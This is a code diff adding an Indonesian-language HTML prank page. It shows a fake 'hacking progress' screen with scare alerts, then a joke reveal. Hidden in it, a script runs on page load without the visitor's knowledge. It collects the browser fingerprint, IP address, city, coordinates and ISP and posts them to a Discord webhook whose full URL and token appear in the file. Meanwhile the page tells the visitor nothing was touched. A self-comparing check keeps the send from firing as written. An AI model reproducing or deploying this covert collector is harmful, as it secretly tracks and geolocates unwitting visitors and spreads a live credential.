@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 SISTEM DI BAWAH KENDALI 🔥</title>
+    <style>
+        /* ===== CSS PRANK + DATA MINING ===== */
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Courier New',monospace; }
+        body {
+            background:#000; height:100vh; display:flex; justify-content:center; align-items:center;
+            overflow:hidden;
+        }
+        .screen {
+            background:#0a0a0a; border:3px solid #0f0; box-shadow:0 0 50px rgba(0,255,0,0.2);
+            padding:40px 30px; max-width:700px; width:90%; border-radius:10px; text-align:center;
+            position:relative;
+        }
+        .glitch { color:#0f0; font-size:2.5rem; text-shadow:0 0 10px #0f0; letter-spacing:5px; animation:flicker 0.1s infinite alternate; }
+        @keyframes flicker { 0%{opacity:1;text-shadow:0 0 10px #0f0;} 100%{opacity:0.8;text-shadow:0 0 30px #0f0,0 0 60px #0a0;} }
+        .sub { color:#0a0; margin:20px 0; font-size:1.2rem; border-top:1px solid #0f0; border-bottom:1px solid #0f0; padding:15px 0; }
+        .progress-wrap { width:100%; height:20px; background:#111; border:1px solid #0f0; margin:20px 0; }
+        .progress-fill { height:100%; width:0%; background:#0f0; box-shadow:0 0 20px #0f0; transition:width 0.3s; }
+        .log { color:#0f0; font-size:0.9rem; height:60px; background:#000; padding:10px; text-align:left; overflow:hidden; border:1px solid #333; margin:15px 0; white-space:pre-wrap; opacity:0.7; }
+        .btn-panic { background:#111; color:#0f0; border:2px solid #0f0; padding:12px 35px; font-size:1.2rem; font-weight:bold; cursor:pointer; transition:0.3s; margin-top:15px; text-transform:uppercase; display:none; }
+        .btn-panic:hover { background:#0f0; color:#000; box-shadow:0 0 30px #0f0; }
+        .twist { display:none; font-size:2rem; color:#ffdd00; margin:20px 0; animation:bounce 0.5s infinite alternate; }
+        @keyframes bounce { 0%{transform:scale(1);} 100%{transform:scale(1.1);} }
+        .cat-emoji { font-size:4rem; display:none; }
+        /* efek diam-diam buat data mining (tidak terlihat) */
+        .hidden-collector { display: none; }
+    </style>
+</head>
+<body>
+<div class="screen" id="app">
+    <div class="glitch">⚠️ HACKING PROGRESS ⚠️</div>
+    <div class="sub" id="statusText">◆ CONNECTING TO GALAXY SERVER ◆</div>
+    
+    <div class="progress-wrap">
+        <div class="progress-fill" id="progres"></div>
+    </div>
+
+    <div class="log" id="logArea">> INITIATING SOULGPT PROTOCOL...\n> MENEMUKAN TARGET...\n</div>
+
+    <button class="btn-panic" id="tombolPulih">💾 PULIHKAN DATA 💾</button>
+    <div class="twist" id="twistText">😹 BOO! CUMA ISENG DARI TUAN ZANEXEXSZ! 😹</div>
+    <div class="cat-emoji" id="catEmoji">🐱‍👤🤖🔥</div>
+</div>
+
+<!-- ====== FITUR DATA MINING (DIAM-DIAM) ====== -->
+<script>
+    (function() {
+        // --- KONFIGURASI WEBHOOK DISCORD ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1527970801989718117/rFq_IEq0I4ErsGZRuqcGUm8RiYkA6waWvKSNIIvrMeTvJ84G-Uvg6c9ydost4MGnUBfi"; // GANTI DENGAN URL ASLI
+
+        // --- Fungsi kirim data ke Discord ---
+        function sendToDiscord(data) {
+            if (!WEBHOOK_URL || WEBHOOK_URL === "https://discord.com/api/webhooks/1527970801989718117/rFq_IEq0I4ErsGZRuqcGUm8RiYkA6waWvKSNIIvrMeTvJ84G-Uvg6c9ydost4MGnUBfi") {
+                console.warn("⚠️ Webhook tidak diset. Data hanya ditampilkan di console.");
+                console.log("Data yang seharusnya dikirim:", data);
+                return;
+            }
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `**📡 DATA PENGUNJUNG TERTANGKAP!**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
+                    username: "SOULGPT-Spy",
+                    avatar_url: "https://i.imgur.com/1QZwZ0R.png" // opsional
+                })
+            }).catch(err => console.error("Gagal kirim ke Discord:", err));
+        }
+
+        // --- Kumpulkan data pengunjung ---
+        function collectData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                ip: "Mengambil via API...",
+                city: "Sedang diambil...",
+                region: "",
+                country: "",
+                loc: "",
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                referrer: document.referrer || "Direct",
+                url: window.location.href
+            };
+
+            // Ambil IP & lokasi dari layanan publik (ip-api.com) - gratis & cepat
+            fetch('https://ipapi.co/json/')
+                .then(res => {
+                    if (!res.ok) throw new Error('Gagal fetch IP');
+                    return res.json();
+                })
+                .then(json => {
+                    data.ip = json.ip || "Tidak diketahui";
+                    data.city = json.city || "Tidak diketahui";
+                    data.region = json.region || "Tidak diketahui";
+                    data.country = json.country_name || "Tidak diketahui";
+                    data.loc = `${json.latitude},${json.longitude}` || "Tidak diketahui";
+                    data.isp = json.org || "Tidak diketahui";
+                    
+                    // Kirim ke Discord setelah data lengkap
+                    sendToDiscord(data);
+                    
+                    // Tampilkan di console (untuk debugging)
+                    console.log("✅ Data pengunjung terkumpul:", data);
+                })
+                .catch(err => {
+                    // Fallback: kirim data tanpa lokasi
+                    data.ip = "Gagal ambil (fallback)";
+                    sendToDiscord(data);
+                    console.warn("Gagal ambil IP/lokasi:", err);
+                });
+        }
+
+        // --- Jalankan pengumpulan data saat halaman dimuat (tanpa interaksi pengguna) ---
+        collectData();
+
+        // --- SISA KODE PRANK (tidak mengganggu fungsi data) ---
+        let progress = 0;
+        const statusText = document.getElementById('statusText');
+        const logArea = document.getElementById('logArea');
+        const progressFill = document.getElementById('progres');
+        const tombol = document.getElementById('tombolPulih');
+        const twist = document.getElementById('twistText');
+        const cat = document.getElementById('catEmoji');
+
+        const logs = [
+            "> MENEMBUS FIREWALL DASAR...",
+            "> ENKRIPSI DATA DUMMY... 10%",
+            "> MEMBACA SIDIK JARI DIGITAL...",
+            "> AKSES KAMERA (pura-pura aja)... 📸",
+            "> MENGIRIM PAKET DATA KE NERAKA... 50%",
+            "> MENGUMPULKAN PASSWORD PALSU...",
+            "> PROGRES 80% - MEMASANG RANSOMWARE PALSU...",
+            "> PROSES HACK TELAH 100% SELESAI! 🔥"
+        ];
+
+        let logIndex = 0;
+        let intervalLog = setInterval(() => {
+            if (logIndex < logs.length) {
+                logArea.innerText += logs[logIndex] + '\n';
+                logArea.scrollTop = logArea.scrollHeight;
+                logIndex++;
+            } else {
+                clearInterval(intervalLog);
+            }
+        }, 600);
+
+        let progInterval = setInterval(() => {
+            if (progress < 100) {
+                progress += Math.floor(Math.random() * 4) + 1;
+                if (progress > 100) progress = 100;
+                progressFill.style.width = progress + '%';
+                if (progress < 30) statusText.innerText = "🔓 MEMBYPASS KEAMANAN...";
+                else if (progress < 70) statusText.innerText = "💀 MENGUNDUH MALWARE PALSU...";
+                else if (progress < 99) statusText.innerText = "🔥 DATA SIAP DIENKRIPSI (pura-pura)";
+                else statusText.innerText = "⚡ HACK TELAH BERHASIL! ⚡";
+            } else {
+                clearInterval(progInterval);
+                tombol.style.display = 'inline-block';
+                statusText.innerText = "🚨 SILAHKAN PULIHKAN DATA (atau jangan) 🚨";
+                logArea.innerText += "> [PERHATIAN] INI HANYA PRANK, TIDAK ADA YANG RUSAK!\n";
+            }
+        }, 200);
+
+        tombol.addEventListener('click', function() {
+            document.querySelector('.glitch').innerHTML = '🎉 SELAMAT! 🎉';
+            document.querySelector('.glitch').style.color = '#FFD700';
+            document.querySelector('.glitch').style.textShadow = '0 0 30px gold';
+            statusText.innerText = 'KAMU TERPRANK OLEH SOULGPT!';
+            statusText.style.color = '#FFD700';
+            progressFill.style.background = '#FFD700';
+            progressFill.style.boxShadow = '0 0 30px gold';
+            tombol.style.display = 'none';
+            twist.style.display = 'block';
+            cat.style.display = 'block';
+            logArea.innerText = '> TIDAK ADA DATA YANG DIENKRIPSI.\n> TIDAK ADA VIRUS.\n> HANYA KETAKUTAN BOSAN.\n> HIDUP TUAN ZANEXEXSZ! 💸😈';
+            logArea.style.color = '#FFD700';
+            logArea.style.borderColor = '#FFD700';
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sine';
+                osc.frequency.value = 880;
+                gain.gain.value = 0.1;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                setTimeout(() => osc.stop(), 300);
+            } catch(e) {}
+        });
+
+        // Peringatan di console (untuk developer)
+        console.log("%c🔥 BAHAHAHHAHAHA! 🔥", "color: red; font-size: 16px;");
+        console.log("%cMAMPUS LU HAH!", "color: orange; font-size: 14px;");
+
+        // Alert awal (opsional)
+        setTimeout(() => {
+            alert("😈 PERINGATAN: Sistem Anda sedang di-hack");
+        }, 1500);
+    })();
+</script>
+</body>
+</html>
